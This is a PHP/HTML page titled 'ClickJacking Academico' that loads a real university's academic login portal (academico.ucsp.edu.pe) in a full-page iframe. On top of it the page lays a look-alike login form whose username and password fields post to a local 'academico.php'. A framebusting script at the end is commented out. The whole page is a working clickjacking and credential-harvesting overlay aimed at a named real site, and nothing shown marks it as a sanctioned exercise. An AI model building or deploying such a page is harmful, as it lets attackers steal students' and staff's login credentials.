<?php header("X-Frame-Options: DENY") ?>
<!DOCTYPE html>
<html>
<head>
	<title>ClickJacking Academico</title>
</head>
<style type="text/css">
	#outer{
		position: absolute;
	}
	#inner{
		position: absolute;
		margin-top: 272px;
		left: 270px;
		opacity: 1.0;
	}
</style>
<body>

<iframe id="outer" src="https://academico.ucsp.edu.pe/" width="100%" height="100%" frameborder="0" scrolling="no"></iframe>


<div id="inner">
    <form action="academico.php" method="post">
	<table border="0" cellpadding="0" cellspacing="0" style="width: 319px">
        <tbody><tr>
            <td colspan="6" align="center">
                <span id="Label15" class="titulo1" style="display:inline-block;width:224px;"></span>
            </td>
        </tr>
        <tr>
            <td colspan="6" style="height: 16px">
                <img src="Imagenes/cab/sup1.jpg">
            </td>
        </tr>
        <tr>
            <td style="width: 13px" rowspan="8">
                <img src="Imagenes/cab/lat6.jpg">
            </td>
            <td style="width: 35px; height: 30px;">
            </td>
            <td style="width: 100px; height: 24px;">
                <span id="lbl_usr" class="etiqueta3" style="display:inline-block;width:100px;"></span></td>
            <td style="width: 173px; height: 24px;">
                <input name="txt_usr" type="text" maxlength="20" id="txt_usr" style="width:150px;"></td>
            <td style="width: 10px; height: 24px;">
                </td>
            <td style="width: 0px" rowspan="8">
                <img src="Imagenes/cab/lat5.jpg"></td>
        </tr>
        <tr>
            <td style="width: 10px; height: 24px;">
            </td>
            <td style="width: 100px; height: 24px;">
                <span id="lbl_pwd" class="etiqueta3" style="display:inline-block;width:100px;"></span></td>
            <td style="width: 173px; height: 24px;">
                <input name="txt_pwd" type="password" maxlength="20" id="txt_pwd" style="width:150px;"></td>
            <td style="width: 10px; height: 24px;">
                </td>
        </tr>
        <tr>
    	<td style="width: 10px; height: 24px;">
            </td>
            <td style="width: 173px" rowspan="2" colspan="2" align="center">
                &nbsp;
                <input type="submit" name="btn_ingresar" value="Ingresar" id="btn_ingresar" class="btn1" style="width:150px; margin-top: 75px; background-color: #032f53; color: white; margin-left: -10px"></td>
                  <td style="width: 10px; height: 24px;">
            </td>
        </tr>
        <tr>
            <td style="width: 10px">
            </td>
            <td style="width: 100px">
            </td>
            <td style="width: 10px">
            </td>
        </tr>
    </tbody>
    </table>
	</form>
</div>

</body>
<!--
<script type="text/javascript">
if (top !== self) top.location.replace(self.location.href);
</script>
-->
</html>